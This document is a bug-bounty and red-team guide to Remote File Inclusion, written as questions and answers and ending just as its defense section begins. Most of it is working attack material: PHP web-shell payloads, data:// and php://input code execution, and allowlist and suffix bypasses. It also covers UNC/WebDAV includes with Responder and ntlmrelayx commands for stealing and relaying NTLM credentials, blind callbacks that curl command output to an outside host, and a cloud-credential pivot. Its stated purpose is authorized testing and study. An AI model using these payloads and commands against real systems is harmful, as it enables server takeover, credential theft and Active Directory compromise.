# Remote File Inclusion (RFI) — Zero to Expert (Q&A, Bug-Bounty / Red-Team Edition)

> A complete, in-depth study + field reference for **Remote File Inclusion** — from "what is RFI" to remote-code
> execution, the `data://`/`php://input` and Windows **UNC/SMB** equivalents (no `allow_url_include` needed), **NTLM
> hash capture & relay**, WebDAV-over-HTTP when SMB is blocked, and the crucial **RFI-vs-SSRF** distinction. Q&A
> format, progressive difficulty. Covers hosting the payload, suffix/scheme/allowlist bypasses, RCE, tooling,
> methodology, real-world patterns, **and** defense.
>
> ⚖️ **Authorized use only.** Bug bounty (in-scope), sanctioned pentests, CTFs, and learning. Prove RCE with a
> **benign computed marker** (`echo 7*7*7` → `343`) and a single `id`/`whoami`; **don't** drop a persistent web/reverse
> shell on a bug-bounty target; validate any read secrets **read-only**; remove anything you wrote. Never test systems
> you don't have written permission to test.

**Canonical references** (cited throughout — real and worth reading in full):
- PortSwigger Web Security Academy — *File inclusion* · OWASP WSTG — *Remote File Inclusion* · OWASP File Inclusion
- PayloadsAllTheThings — *File Inclusion (RFI)* · HackTricks — *LFI/RFI* & *LFI2RCE*
- `kurobeats/fimap` · impacket-smbserver / Responder / ntlmrelayx · PHP `allow_url_include`/`allow_url_fopen` docs
- CWE-98 (Improper Control of Filename for Include/Require) · CWE-94 (Code Injection)
- Companion kit in this repo: `Web/RFI/` (guide + arsenal + checklist + report template + `poc/`)

---

## TABLE OF CONTENTS
- **Level 0 — Fundamentals** (Q1–Q12)
- **Level 1 — Recon & baseline (prove execution)** (Q13–Q22)
- **Level 2 — Making it land (host, suffix, scheme, allowlist)** (Q23–Q38)
- **Level 3 — Equivalents: data://, php://input, UNC/SMB, NTLM, WebDAV** (Q39–Q56)
- **Level 4 — RFI → RCE → shell, blind & other stacks** (Q57–Q74)
- **Level 5 — RFI-vs-SSRF validity, triage & chains** (Q75–Q84)
- **Tooling** (Q85–Q88)
- **Cheat sheets** (Q89–Q93)
- **Real-world patterns & references** (Q94–Q95)
- **Defense — preventing RFI** (Q96–Q100)

---

# LEVEL 0 — FUNDAMENTALS

### Q1. What is Remote File Inclusion?
A flaw where the application **includes/executes a file whose location you influence**, and that location can be **remote** (or a wrapper supplying content) — so the server pulls in and **runs attacker-supplied code**. The classic PHP sink:
```php
include($_GET['page'] . ".php");     // ?page=http://evil.com/shell.txt?  → includes & runs your PHP
```
When RFI is real, it's **RCE** — usually **Critical**.

### Q2. RFI vs SSRF vs LFI — the critical distinction?
```
RFI  → server INCLUDES/EXECUTES a remote/attacker file → RCE.                 (this kit)
SSRF → server FETCHES your URL but doesn't execute it  → internal reach/creds (SSRF kit).
LFI  → server includes/reads a LOCAL file              → disclosure or RCE via poisoning (LFI kit).
```
The decision hinges on **execution**: does your hosted code *run* (RFI), or does the server merely *request* it (SSRF)?

### Q3. Why is the RFI-vs-SSRF distinction so important?
Because it's the #1 way RFI reports get mis-filed. A request landing on your server proves the server **reached out** — that's **SSRF** unless your **code executed**. Reporting an SSRF as "RFI" gets closed; reporting an RFI's mere callback under-claims it. Prove **execution** (a unique computed value runs) to call it RFI.

### Q4. Why is RFI almost always Critical?
Because "include my file" equals "run my code." If the sink *includes/executes* a remote file you control, you host `<?php system($_GET['c']);?>` and you have a shell. So the report is **proving execution**, not arguing severity — real RFI is full server compromise.

### Q5. Is RFI still common in 2026?
Rarer than its heyday (PHP set `allow_url_include=Off` by default since 5.2), but very much alive in **legacy apps, abandoned CMS plugins/themes, internal tools, Windows/UNC includes**, and via the **`data://`/`php://input` equivalents** and **`<cfinclude>`/`<jsp:include>`** on other stacks. Don't assume it's dead.

### Q6. What is `allow_url_include` and why does it matter?
A PHP setting. When **On**, `include`/`require` can fetch a **remote URL** (classic RFI). When **Off** (the default), `http://` includes are refused — **but** you can still win via **`data://`** and **`php://input`** (no outbound fetch) and, on **Windows**, **UNC/SMB** (which don't use the URL-include path at all). Always test these equivalents.

### Q7. What's the #1 mistake when testing RFI?
Stopping when `http://` is refused. `allow_url_include=Off` blocks the *classic* RFI, but **`data://`/`php://input`/UNC** frequently still execute. The second mistake: confusing a **fetch** (SSRF) with **execution** (RFI) — prove your code ran.

### Q8. Where do RFI sinks live?
Params: `page= file= include= require= path= template= module= plugin= theme= load= url= conf= lang=`. Features: plugin/theme/module loaders (legacy CMS), "load template/config from URL", skin selectors, remote dashboard widgets, update/installer endpoints. Sinks: `include/require` with a user-influenced URL (PHP); `<jsp:include page=>`/`<c:import url=>` (JSP); `<cfinclude template=>` (ColdFusion); dynamic `require()`/`import()` (Node).

### Q9. Why must I host my payload as TEXT, not as a `.php`?
Your attacker server must serve the PHP **as text** (`Content-Type: text/plain`, no PHP engine) so it isn't executed on *your* box and travels to the target intact. The **target** executes it. Serving it as PHP on your host would run it on you and send the target only the output.

### Q10. What's the mental model?
RFI hands the attacker the **`include()` of their choice** — "run my file." Severity is almost always **Critical** because including your file equals running your code. Your job is to make the include **land** and **prove execution**.

### Q11. What do I need before testing?
A proxy (Burp), a **payload host** reachable from the target serving PHP as text (the kit's `poc/payload_host.py`), an **OOB listener** (interactsh) for blind cases, and — for Windows — `impacket-smbserver`/Responder to host the UNC/WebDAV share.

### Q12. What's the impact ordering?
① **remote include of your code → RCE/shell** (the whole point) — Critical → ② **`data://`/`php://input` code execution** (no remote URL) — Critical → ③ **Windows UNC/SMB include → RCE** — Critical → ④ **UNC fetch → NTLM hash capture/relay** (even without execution) — High → ⑤ a remote include that only **fetches** (no exec) → that's **SSRF** (pivot kit).

---

# LEVEL 1 — RECON & BASELINE (PROVE EXECUTION)

### Q13. How do I find remote-includable sinks?
Fuzz the §8 param names; hunt legacy/CMS apps, abandoned plugins/themes, installers, `?page=` routers; grep source/JS for `include/require/cfinclude/jsp:include/Server.Execute` with user input; and — key — test any confirmed **LFI include** sink (LFI kit) for RFI equivalents (a remote URL, then `data://`/`php://input`). Old Wayback endpoints with `page`/`file`/`url` params often predate the `allow_url_include` hardening.

### Q14. An LFI include sink — is it an RFI candidate?
Yes — immediately test RFI equivalents there: a remote URL (if `allow_url_include=On`), then **`data://`/`php://input`** (work even when Off). The same sink that did log-poison RCE will often do `data://` RCE in one request.

### Q15. What's the baseline execution test?
Host a file that **computes** something only executing code can produce, then look for the result:
```php
// shell.txt on YOUR host (served as text/plain):
<?php echo "RFI-EXEC-".(7*7*7); ?>          // executing PHP prints: RFI-EXEC-343
```
```
?page=http://YOUR_IP:8000/shell.txt?  →  response contains "RFI-EXEC-343"?  → the PHP RAN → RFI confirmed.
```

### Q16. How do I interpret the baseline outcomes?
```
"RFI-EXEC-343" in the response          → code EXECUTED → RFI/RCE confirmed (Critical).
raw "<?php echo ..." text shown          → included but NOT executed (template/text context) → not RCE; reassess.
my host got a request, normal page back  → server only FETCHED it → SSRF, not RFI (SSRF kit).
no request to my host at all             → not remote-includable (try data://, UNC, or it's LFI-only).
```

### Q17. Why use a *computed* marker instead of just a request?
Because a request landing on your host proves only a **fetch** (SSRF). A unique **computed** value (`7*7*7 = 343`) appears only if your **code executed** — that's what upgrades it to RFI/RCE. The computation can't be produced by a mere fetch.

### Q18. What do I note from the baseline?
The forced **suffix** (if the error shows `shell.txt.php`), whether `allow_url_include` is on (does remote `http://` work?), whether redirects are followed, and the **source IP** of the hit (the server/cloud IP — useful evidence + tells you the environment, e.g., Windows for UNC).

### Q19. The server fetched my URL but nothing executed — what is it?
**SSRF**, not RFI. Report it in the SSRF kit (it could still be Critical via internal/metadata reach). Don't claim RFI without execution. (Many "RFI" reports are actually SSRF.)

### Q20. My raw `<?php` text shows in the page — is that RFI?
No — it was included in a **non-executing** context (the bytes were echoed, not run). That might be a stored-XSS/info-disclosure angle, but it's **not** RCE. Reassess; don't report it as RFI.

### Q21. How do I confirm execution blind (no visible output)?
Host a payload that **executes a callback carrying command output** (or a delay): `<?php system('curl http://YOUR_OOB/exec_'.\`id\`); ?>` → an OOB hit whose path contains `id` output proves the code **ran**; or `<?php sleep(10); ?>` → a measured delay proves execution. A plain fetch with no execution is SSRF (§Level 5).

### Q22. What's the deliverable from baseline?
Either **confirmed remote execution** (the `343` marker / command output) → proceed to make-it-land + RCE, or a determination that it's **fetch-only (SSRF)** / non-executing → reclassify. Plus the suffix/`allow_url_include`/redirect notes for the next phase.

---

# LEVEL 2 — MAKING IT LAND (HOST, SUFFIX, SCHEME, ALLOWLIST)

### Q23. How do I host the payload correctly?
Serve it as **`text/plain`** with a **`.txt`** name (so it's not executed on your box and the suffix-defeats work). Use the kit's `poc/payload_host.py` (sets the content-type + logs hits) or a static file on a non-PHP server. The target must be able to **reach** your host (public VPS / ngrok / cloudflared).

### Q24. What if the target only allows outbound :80/:443?
Re-host your payload on **port 80 or 443**. Some targets block high ports for egress; 80/443 are almost always allowed. (This also matters for WebDAV, §Level 3.)

### Q25. The sink appends `.php` — how do I defeat the forced suffix?
Host `shell.txt` and neutralize the appended suffix so your `.txt` still loads:
```
?page=http://YOUR_IP/shell.txt?      → server sees shell.txt?.php  (.php becomes a query)   ★ most reliable
?page=http://YOUR_IP/shell.txt%23    → shell.txt#... (fragment dropped)   (%23 = #)
?page=http://YOUR_IP/shell.txt%00    → truncates ".php" (PHP < 5.3.4)
?page=http://YOUR_IP/shell.txt%253f  → double-encoded ?
```

### Q26. Why is the `?` trick the most reliable suffix-defeat?
Because appending `?` makes the appended `.php` parse as the **query string** of your URL (`shell.txt?.php`), so the file actually fetched is `shell.txt`. The `?`-trick works on most stacks; `%23`/`%00` are fallbacks.

### Q27. What schemes should I try?
`http://`, `https://`, `ftp://`, `ftps://` (standard remote include); `\\attacker\share\shell.php` (Windows UNC, §Level 3); `data://`, `php://input`, `expect://` (no remote URL, §Level 3); `smb://` (some configs). If one scheme is blocked, swap to another.

### Q28. `http://` is blocked but `https://` isn't (or vice-versa) — now what?
Swap schemes. Filters often block one but not the other. If the whole `http(s)` family is blocked, fall back to **`data://`/`php://input`** (no outbound fetch) or **UNC** on Windows (§Level 3).

### Q29. Scheme/host encoding bypasses?
Case (`hTtP://`), slash-confusion (`http:/\YOUR_IP/`), IP obfuscation (`http://0xC0A80001/`, `http://3232235521/` — decimal/hex host), encoded slash (`http://YOUR_IP%2fshell.txt`), and `@`-confusion (`http://allowed.com@YOUR_IP/`). Reuse the SSRF kit's IP-obfuscation/parser-confusion set.

### Q30. The include validates the host (allowlist) — bypasses?
```
open redirect on an allowed host:  ?page=https://allowed.com/redirect?u=http://YOUR_IP/shell.txt?  (server follows → your file)
"starts with allowed":             ?page=http://allowed.com.YOUR_DOMAIN/shell.txt?  (you own *.YOUR_DOMAIN)
"contains allowed":                ?page=http://YOUR_IP/allowed.com/shell.txt?
@-confusion (validator vs fetcher): ?page=http://allowed.com@YOUR_IP/shell.txt?
DNS: point a name you control at your payload host to satisfy a "must be a domain" check.
```

### Q31. Why is an open redirect on an allowed host so useful?
Because the include **validates** the first URL (an allowed host) but then **follows** the redirect to your payload — smuggling your URL past the host allowlist. It's the cleanest allowlist bypass when the fetcher follows redirects.

### Q32. How do I know if the fetcher follows redirects?
Point the sink at a `302` on your host that redirects to a second resource and see if the second resource is fetched/executed. If it follows, the open-redirect bypass (Q30/Q31) is on the table.

### Q33. What's the danger of hosting PHP as PHP on my box?
Your own server would **execute** it (running attacker code on you) and send the target only the **output**, not the source — so the target can't execute it. Always serve as **text/plain**. This is the most common beginner mistake.

### Q34. How do I confirm my payload landed (not just was requested)?
Your payload host **logs the include hit** (source IP + path) — that's evidence the server reached out. But "reached out" = fetch (SSRF). The **execution** proof is the computed marker (`343`) in the *target's* response (or the OOB callback carrying command output for blind). Both: host-log + marker.

### Q35. The response shows my computed value through the suffix-defeat — what now?
RFI/RCE confirmed. Swap to the command payload (`<?php system($_GET['c']);?>`) and run a single benign `id`/`whoami` (Level 4). For bug bounty, that's a complete Critical.

### Q36. What if the payload host gets no hit at all?
The sink isn't fetching your URL → not remote-includable via `http(s)`. Try **`data://`/`php://input`** (no outbound fetch), **UNC/SMB** (Windows), and confirm the suffix-defeat. If still nothing, it may be **LFI-only** (local includes only) — pivot to the LFI kit.

### Q37. Can I combine suffix-defeat + allowlist bypass?
Yes — e.g., `?page=https://allowed.com/redirect?u=http://YOUR_IP/shell.txt?` (redirect bypass + `?` suffix-defeat). Stack the techniques: get past the host check, then land the `.txt` despite the appended suffix.

### Q38. The end-state of Level 2?
Your remote file is **reliably included** (and the computed marker proves execution) despite suffix/scheme/allowlist defenses. Now escalate to RCE/shell (Level 4) — or, if `http://` is fully blocked, use the equivalents (Level 3).

---

# LEVEL 3 — EQUIVALENTS: data://, php://input, UNC/SMB, NTLM, WebDAV

### Q39. What is `data://` RFI?
A wrapper that supplies the included content **inline** — no outbound fetch (needs `allow_url_include=On`, but no remote URL):
```
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+&c=id   (b64 = <?php system($_GET['c']);?>)
```
The include executes the base64-decoded PHP → RCE. Often works where remote `http://` is refused.

### Q40. What is `php://input` RFI?
The included content is read from the **POST body**:
```
?page=php://input        POST body: <?php system($_GET['c']); ?>   (query: ?c=id)
```
Needs `allow_url_include=On`. Like `data://`, no outbound fetch — a common "RFI still works" path on modern PHP.

### Q41. What is `expect://`?
`?page=expect://id` runs the command **directly** (needs the uncommon `expect` PHP extension). Instant RCE when available — try it.

### Q42. Why test `data://`/`php://input` first when `http://` is blocked?
Because `allow_url_include=Off` blocks remote URL fetches but these wrappers don't fetch a remote URL — they supply content locally. They're the most common way RFI "still works" on hardened PHP, and they need only the one parameter (no reachable payload host).

### Q43. How do I check if `allow_url_include` is on without a config dump?
Just **test** `data://`: `?page=data://text/plain;base64,<b64 of <?php echo 1337*1338;?>>` → if `1788906` appears, `allow_url_include` (and `data://`) is on → RCE is one request away. (Or dump `php.ini`/`phpinfo` via LFI `php://filter`.)

### Q44. What is the Windows UNC/SMB include?
On **Windows** PHP, including a **UNC path** pulls the file over SMB and executes it — and this does **not** require `allow_url_include`:
```
?page=\\YOUR_IP\share\shell.php   (impacket-smbserver share ./www -smb2support, serving shell.php)
→ the Windows PHP includes & executes shell.php over SMB → RCE.
```
The go-to RFI path on Windows when `allow_url_include=Off`.

### Q45. What's the precondition for UNC include?
A **Windows** target, an include sink, and **outbound SMB/445** allowed (common on internal/corporate targets; often blocked on cloud — then use WebDAV, Q48). Stand up `impacket-smbserver`/Responder, point the include at `\\YOUR_IP\share\shell.php`.

### Q46. The killer extra: NTLM hash capture even without execution?
Yes. The instant a Windows host opens `\\YOUR_IP\share\...`, it **authenticates to your SMB server with the machine/service account** — *before* (and regardless of whether) the file executes. So a UNC include leaks the target's **NetNTLMv2 hash** even if `allow_url_include` is off **and** the file never runs:
```
sudo responder -I eth0   →   ?page=\\YOUR_IP\x   →   captured NetNTLMv2 hash + the target's source IP
hashcat -m 5600 ntlm.txt rockyou.txt             →   crack the machine/service account password
```

### Q47. What is NTLM relay (and when do I use it)?
Instead of cracking, **relay** the coerced authentication to **another** service:
```
ntlmrelayx.py -smb2support -t ldap://<DC>   (or -t smb://<host> / -t http://<host>)   →   ?page=\\YOUR_IP\x
→ the target's auth is relayed → command exec / DCSync / AD takeover (no cracking needed).
```
Authorized **red-team** only — the include becomes an **auth-coercion** primitive (like an SSRF that forces NTLM).

### Q48. SMB/445 egress is blocked — how do I still win?
Use **WebDAV** over HTTP(S) — Windows' redirector falls back to it, and outbound 80/443 is almost always allowed:
```
?page=\\YOUR_IP@80\share\shell.php       (UNC over WebDAV, HTTP/80)
?page=\\YOUR_IP@SSL@443\share\shell.php  (UNC over WebDAV, HTTPS/443)
```
Host a WebDAV server (`wsgidav`/Responder WebDAV) serving `shell.php` → it **executes** (RFI→RCE) **and** the WebDAV auth still leaks the NetNTLM hash where raw SMB couldn't.

### Q49. Is the NTLM-capture a valid bug-bounty finding on its own?
Yes — even if execution fails or the program disputes RCE, the server-side UNC fetch **coerces NTLM authentication** to your host → captured hash (crack) or relay (lateral movement). The captured NetNTLM hash + the source IP is solid evidence of an SSRF/auth-coercion bug. It's a second payoff from the same sink.

### Q50. data:// vs UNC vs http:// — which do I reach for?
`http(s)://` if `allow_url_include=On` (classic). `data://`/`php://input` if it's Off (no fetch needed). **UNC/SMB** on Windows (no `allow_url_include`, plus NTLM capture). WebDAV (`@80`/`@SSL@443`) if SMB egress is blocked. Test in that order based on the stack/OS and what the baseline showed.

### Q51. Can these equivalents be combined with suffix-defeats?
`data://`/`php://input` don't need a suffix-defeat (no `.php` appended to a wrapper resource in the same way). UNC paths can take a `%00` if a suffix is forced. Mostly the wrappers sidestep the suffix problem entirely.

### Q52. What about `zip://`/`phar://` (LFI-style)?
Those are more LFI (they reference a **local** archive). If you can **upload** a file + the LFI/RFI sink includes it, `zip://uploaded.jpg%23shell.php` or `phar://uploaded.phar/x` (deserialization) → RCE — but that's the LFI/upload chain, not classic RFI. Cross-ref the LFI/FileUpload kits.

### Q53. Why does UNC/SMB not need `allow_url_include`?
Because a UNC path isn't a "URL include" in PHP's eyes — it's a **filesystem path** (Windows resolves `\\host\share` via the SMB redirector). So PHP's `allow_url_include` check (which gates `http://`/`ftp://`/`data://` style URLs) doesn't apply. That's why it bypasses the URL-include restriction.

### Q54. How do I prove a UNC include executed (vs just connected)?
Same as http: host `shell.php` with the **computed marker** (`<?php echo 7*7*7; ?>`) and look for `343` in the target's response. The Responder/SMB log shows the **connection** (fetch); the `343` shows **execution**. (And even a connection-only result is the NTLM-capture finding.)

### Q55. Is `php://filter` an RFI technique?
No — `php://filter` reads a **local** file's source (an LFI disclosure technique). RFI is about including a **remote/wrapper-supplied** file that **executes**. They're cousins (often the same sink), but `php://filter` is LFI; `data://`/`php://input`/UNC are the RFI equivalents.

### Q56. The end-state of Level 3?
**Code execution without `allow_url_include`** via `data://`/`php://input`/UNC (or RCE+hash via WebDAV) — or, at minimum, the **NTLM-capture** finding from the UNC fetch. Now prove RCE safely (Level 4).

---

# LEVEL 4 — RFI → RCE → SHELL, BLIND & OTHER STACKS

### Q57. How do I escalate from "code runs" to RCE proof?
Build up from benign to (authorized) shell:
```
1. BENIGN PROOF (always first):  shell.txt = <?php echo "RFI-EXEC-".(7*7*7); ?>  → "RFI-EXEC-343".
2. COMMAND EXEC:                 shell.txt = <?php system($_GET['c']); ?>  → ?page=...shell.txt?&c=id → uid output.
3. INTERACTIVE (authorized only): a reverse shell — bug bounty: a single `id` is enough.
```

### Q58. What's enough proof for a bug-bounty RFI report?
A single `system('id')`/`whoami` output (or the computed marker + a benign command). You do **not** need a reverse shell — RFI→RCE is already Critical. For an authorized red-team, escalate to a shell, pivot, and clean up.

### Q59. How do I prove impact safely and pivot?
Prove with `id`/`whoami`/`hostname` or a unique marker. Pivot (authorized, read-only): read app config/.env → DB/cloud creds (validate read-only, redact); read cloud metadata from the box (SSRF kit §11); internal recon. **Remove** anything you wrote (shells/uploads); for bug bounty, **`id` and stop**.

### Q60. How do I confirm and exploit blind RFI?
Host a payload that **executes a callback carrying command output** (or a `sleep`): `<?php system('curl http://YOUR_OOB/exec_'.\`id\`); ?>` → an OOB hit whose path carries `id` output proves execution; `<?php sleep(10); ?>` → a measured delay. A plain fetch with no execution is SSRF.

### Q61. RFI on JSP/Java?
`<jsp:include page="http://YOUR_IP/shell.jsp"/>` or `<c:import url=...>` with user input → host a `.jsp` web shell → RCE. Java's remote include of a JSP executes it the same way PHP does.

### Q62. RFI on ColdFusion?
`<cfinclude template="#url.x#">` with a remote/UNC value → host a `.cfm` → RCE (`<cfexecute>`). ColdFusion has a long history of include/upload RCE; always test `.cfm` includes.

### Q63. RFI on Node.js / Python?
Dynamic `require(userInput)`/`import(userInput)` (Node) or `__import__`/`importlib` of user input (Python) → a remote/poisoned module → RCE (rarer but devastating). If it's a **template** engine fetching a remote/inline template, that's usually **SSTI** (pivot to the SSTI kit) → RCE.

### Q64. Classic ASP / .NET?
`Server.Execute`/virtual includes/dynamic `Server.MapPath` with a remote value → varies; often LFI-only on modern IIS. The Windows **UNC** include path (§Level 3) is the more reliable .NET/PHP-on-Windows RFI/RCE+NTLM vector.

### Q65. How do I weaponize a confirmed RFI into a web shell (red-team)?
Host a minimal command-exec shell (`<?php system($_GET['c']);?>`) — but on **bug bounty**, a single `id` is the report; don't leave a backdoor. On authorized red-team, you may drop a controlled shell, pivot, and remove it afterward.

### Q66. RFI → cloud takeover chain?
From the RCE, read instance metadata (`curl http://169.254.169.254/...`) → IAM creds → validate read-only (`aws sts get-caller-identity`) → cloud-account compromise / a cloud run-command surface → shell. Stop at proof (SSRF-kit discipline).

### Q67. RFI → internal pivot chain?
RFI → web shell → read internal config, reach internal services, grab cloud creds → lateral movement (SSRF kit from inside). The RFI is the perimeter break into the internal estate.

### Q68. RFI → NTLM relay → AD takeover (Windows red-team)?
UNC include → coerced NTLM auth → `ntlmrelayx` to LDAP/SMB → command exec / DCSync → domain compromise. A Windows RFI sink is an **auth-coercion** primitive into Active Directory. Authorized engagements only.

### Q69. How do I read secrets via an RFI RCE?
Run a benign read of config/.env (`<?php system('head /var/www/config.php'); ?>` or via your command shell), **minimally** and **redacted**, to demonstrate credential exposure → pivot read-only. Don't exfiltrate large amounts of real data.

### Q70. What's the severity & CWE?
RFI→RCE: `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` → Critical (~9.8). **CWE-98** (Improper Control of Filename for Include) + **CWE-94** (Code Injection). UNC NTLM-capture without exec → High (CWE-918-style auth coercion).

### Q71. How do I handle "RFI but execution is constrained" (sandboxed include)?
Read what you can (config/secrets), and if the constrained context still includes your file, demonstrate the highest available impact. If it's truly non-executing, it's not RCE — reassess (maybe stored XSS / info-leak, or SSRF if only fetched).

### Q72. RFI on a non-PHP, non-Windows stack with no template engine?
Often there's no remote-include RCE — you may only get a **fetch** (SSRF). Be honest: prove execution before claiming RFI; otherwise report it as SSRF. The classic remote-include→RCE is mostly PHP/JSP/CFML/Windows-UNC.

### Q73. Can I get RFI via a webhook/import-from-URL feature?
Only if it **includes/executes** the fetched content. Most "import from URL" features **parse** (CSV/XML) or **fetch** — that's SSRF, not RFI. Test whether the fetched file is *included as code*; if it's only parsed, it's a different class.

### Q74. The end-state of Level 4?
**Demonstrated RCE** (computed marker + a benign `id`, or an OOB callback carrying command output for blind) — or the **NTLM-capture** finding on Windows. Clean up; report the impact.

---

# LEVEL 5 — RFI-vs-SSRF VALIDITY, TRIAGE & CHAINS

### Q75. The four questions a triager asks?
1. **Did your CODE execute on the server?** Show the unique computed marker (`343`) or command output — not just a request to your host. 2. **What concrete impact?** RCE/shell/secrets. 3. **What does the attacker need?** Often just an unauthenticated request → Critical. 4. **Reproducible & in scope?** Exact endpoint, the include payload (+ suffix-defeat/equivalent), your host's evidence, the marker.

### Q76. The "fetch vs execute" rule (most important)?
```
Server EXECUTED your remote file (computed marker / cmd output) → RFI → Critical.
Server FETCHED your URL, no execution                          → SSRF (not RFI) → SSRF kit.
data:// / php://input executed your PHP                         → RFI/RCE → Critical.
UNC include ran your .php (Windows)                            → RFI → Critical.
UNC fetch coerced NTLM (no exec)                               → auth-coercion/SSRF → High.
your raw <?php text shown in the page                          → non-exec include → not RCE.
```

### Q77. Production-scope discipline?
Confirm on **production** with a benign marker. Validate any read secrets read-only. Re-test partial fixes — blocking `http://` but not `data://`, or the literal host but not an open-redirect bounce, is a **fresh** valid finding.

### Q78. False positives / auto-reject (don't submit as RFI if…)?
- The server only **fetched** your URL (no execution) → that's **SSRF**.
- Your raw `<?php` text merely **displayed** (non-executing context).
- An open redirect / remote image load mislabeled as RFI.
- `http://` was refused and you **didn't** test `data://`/`php://input`/UNC.
- Only a blind hit with **no execution proof**.
- DoS by including a huge remote file.

### Q79. How do I escalate a "fetch-only" result?
It's SSRF — pivot to the SSRF kit: steer it internal/metadata for IAM creds (still Critical there). On Windows, even a fetch-only UNC gives you the **NTLM-capture** finding. Don't force an RFI label; report the class you can actually prove.

### Q80. Chain: open redirect (allowed host) → RFI past the allowlist.
The include validates the first URL (allowed host) but follows a redirect → host an open-redirect on the allowed host pointing at your payload → RFI past the allowlist → RCE. A clean chain when the fetcher follows redirects.

### Q81. Chain: LFI include sink → RFI equivalents → RCE.
A confirmed LFI **include** sink is an RFI candidate: test a remote URL (if `allow_url_include=On`), then `data://`/`php://input` (work even Off), then UNC on Windows. The same sink that did log-poison RCE often does `data://` RCE in one request.

### Q82. Chain: RFI → web shell → cloud/internal.
RFI → RCE → read config/.env → DB/cloud creds → cloud takeover (read-only proof) / internal pivot. The remote include is the entry; the post-RCE chain is the impact (same discipline as LFI/cmdi).

### Q83. How do I de-duplicate RFI findings?
One **include sink / root cause** = one finding even if reachable via several schemes/params; lead with the cleanest RCE proof. Don't split "include reached my server" and "RCE" — one report. If it's actually a fetch, file it as **SSRF**, not a duplicate RFI.

### Q84. What separates expert RFI testing from beginner?
The expert (1) **proves execution** (computed marker), never mislabels a fetch as RFI; (2) doesn't stop at `allow_url_include=Off` — tests **`data://`/`php://input`/UNC**; (3) knows the **suffix-defeat (`?`)** and **allowlist/redirect** bypasses; (4) on Windows, harvests the **NTLM hash** (capture/relay) and uses **WebDAV** when SMB is blocked; (5) **chains** to cloud/internal/AD; and (6) proves with a benign marker + `id` and cleans up.

---

# TOOLING

### Q85. Core RFI toolkit?
**Burp** (tamper the include param); a **payload host** serving PHP as text + logging hits (`poc/payload_host.py`); `poc/rfi_probe.py` (schemes + suffix-defeats + execution check); **interactsh** (blind OOB); **`fimap`** (FI scanner — verify + clean up); on Windows, **`impacket-smbserver`/Responder** (UNC + NTLM capture), **`ntlmrelayx`** (relay), **`wsgidav`** (WebDAV).

### Q86. How does the payload host prove RFI vs SSRF?
It serves PHP as **text/plain** and logs the include hit (source IP). The **log** proves the server fetched it (could be SSRF); the **computed marker** (`343`) in the target's response proves your code **executed** (RFI). You need both: the hit + the marker.

### Q87. How do I build a success oracle for automation?
After each include payload: check the target response for the unique **marker** (`RFI-EXEC-343`), not just a 200 or a host-log hit. For blind: watch interactsh for a callback carrying command output. Gate findings on **execution**, not on a fetch.

### Q88. How do I test the Windows/NTLM/WebDAV angles with tooling?
`impacket-smbserver share ./www -smb2support` (host the share) or `sudo responder -I eth0` (capture NetNTLMv2). Point the include at `\\YOUR_IP\share\shell.php`. SMB blocked? host WebDAV (`wsgidav`) and use `\\YOUR_IP@80\share\x` / `\\YOUR_IP@SSL@443\share\x`. Relay with `ntlmrelayx.py -t <host>` (authorized).

---

# CHEAT SHEETS

### Q89. Core RFI payload cheat sheet.
```
?page=http://YOUR_IP/shell.txt?        ? swallows appended .php   ★ most reliable
?page=http://YOUR_IP/shell.txt%23      # fragment      ?page=http://YOUR_IP/shell.txt%00   null (legacy)
?page=https://YOUR_IP/shell.txt?       scheme swap     ?page=ftp://YOUR_IP/shell.txt?
benign proof host file:  <?php echo "RFI-EXEC-".(7*7*7); ?>   (expect RFI-EXEC-343)
command:                 <?php system($_GET['c']); ?>   (&c=id)
```

### Q90. Equivalents cheat sheet (no http://).
```
data://:      ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+&c=id   (allow_url_include)
php://input:  ?page=php://input   POST: <?php system($_GET['c']); ?>   (?c=id)
expect://:    ?page=expect://id
UNC (Win):    ?page=\\YOUR_IP\share\shell.php   (impacket-smbserver; no allow_url_include)
WebDAV (Win): ?page=\\YOUR_IP@80\share\shell.php   ?page=\\YOUR_IP@SSL@443\share\shell.php   (SMB 445 blocked)
```

### Q91. NTLM capture/relay cheat sheet (Windows).
```
sudo responder -I eth0          →  ?page=\\YOUR_IP\x   →  NetNTLMv2 hash + source IP  →  hashcat -m 5600
ntlmrelayx.py -smb2support -t ldap://<DC>   →  ?page=\\YOUR_IP\x   →  relay → exec/DCSync (authorized red-team)
```

### Q92. Allowlist-bypass cheat sheet.
```
https://allowed.com/redirect?url=http://YOUR_IP/shell.txt?     open redirect on allowed host (server follows)
http://allowed.com.YOUR_DOMAIN/shell.txt?                      "startsWith allowed"
http://YOUR_IP/allowed.com/shell.txt?                          "contains allowed"
http://allowed.com@YOUR_IP/shell.txt?                          @-confusion (validator vs fetcher)
```

### Q93. RFI-vs-SSRF decision cheat sheet.
```
computed marker (343) / cmd output runs   → RFI → RCE = Critical
data:// / php://input / UNC executes       → RFI → RCE = Critical
only a FETCH (no execution)               → SSRF → SSRF kit
UNC fetch, no exec                         → NTLM capture/relay = auth-coercion (High)
raw <?php text displayed                   → non-exec include → not RCE
```

---

# REAL-WORLD PATTERNS & REFERENCES

### Q94. Recurring real-world RFI surfaces.
- Legacy PHP apps / abandoned plugins & themes with `include($_GET[...])` and `allow_url_include=On` (WordPress plugins, osCommerce, Joomla ext., TimThumb-era code) — the classic mass-exploited RFI.
- `allow_url_include=Off` → RFI "still works" via **`data://`/`php://input`** and, on Windows, **UNC/SMB** (+ NTLM capture).
- ColdFusion `<cfinclude>` / JSP `<jsp:include>` / `<c:import>` with user input → host `.cfm`/`.jsp` → RCE.
- Node dynamic `require()`/`import()` / Python `__import__` of user input → remote/poisoned module → RCE.
- Windows UNC include + Responder/impacket → RCE **and** NTLM hash capture/relay → AD lateral movement.
- Open-redirect-on-allowed-host → smuggle the payload URL past a host allowlist → RFI.
- Confusing RFI with SSRF: a fetch with no execution is **SSRF**.

### Q95. Resources to work through.
PortSwigger Academy → **File inclusion**; PayloadsAllTheThings *File Inclusion (RFI)*; HackTricks *LFI/RFI* & *LFI2RCE*; OWASP WSTG (Remote File Inclusion); `kurobeats/fimap`; impacket / Responder / ntlmrelayx docs; PHP `allow_url_include`/`allow_url_fopen` docs. Read disclosed reports tagged "RFI / remote file inclusion / RCE" (and note how many "RFI" reports were actually SSRF).

---

# DEFENSE — PREVENTING RFI

### Q96. What's the secure design?
